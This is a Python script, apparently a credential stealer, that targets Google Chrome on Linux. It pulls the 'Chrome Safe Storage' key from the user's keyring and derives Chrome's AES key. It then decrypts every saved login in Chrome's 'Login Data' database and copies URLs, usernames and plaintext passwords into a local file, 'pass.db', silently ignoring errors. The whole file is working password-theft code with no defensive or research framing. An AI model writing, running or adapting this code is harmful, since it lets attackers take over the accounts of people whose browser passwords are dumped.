import secretstorage
import json
import platform
import sqlite3
import string
import subprocess
import os
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy


class ChromeLinux:

    def __init__(self):
        my_pass = 'peanuts'.encode('utf8')
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                my_pass = item.get_secret()
                break
        iterations = 1
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"

    def decrypt_func(self, enc_passwd):
        
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class Chrome:
    
    def __init__(self):
        self.chrome_os = ChromeLinux()

    @property
    def get_login_db(self):
        
        return self.chrome_os.dbpath

    def get_password(self, prettyprint=False):
        
        conn = sqlite3.connect(self.chrome_os.dbpath + "Login Data")
        conn2 = sqlite3.connect("pass.db")
        cursor = conn.cursor()
        cursor2 = conn2.cursor()
        try:
            cursor.execute("""SELECT action_url, username_value, password_value FROM logins; """)
            cursor2.execute('''CREATE TABLE passwords(url, username, password)''')
            for r in cursor.fetchall():
                _passwd = self.chrome_os.decrypt_func(r[2])
                if _passwd:
                    cursor2.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (r[0], r[1], _passwd))
                    conn2.commit()
        except:
            pass
        finally:
            cursor.close()
            conn.close()


def main():

    chrome_pwd = Chrome()
    chrome_pwd.get_password()
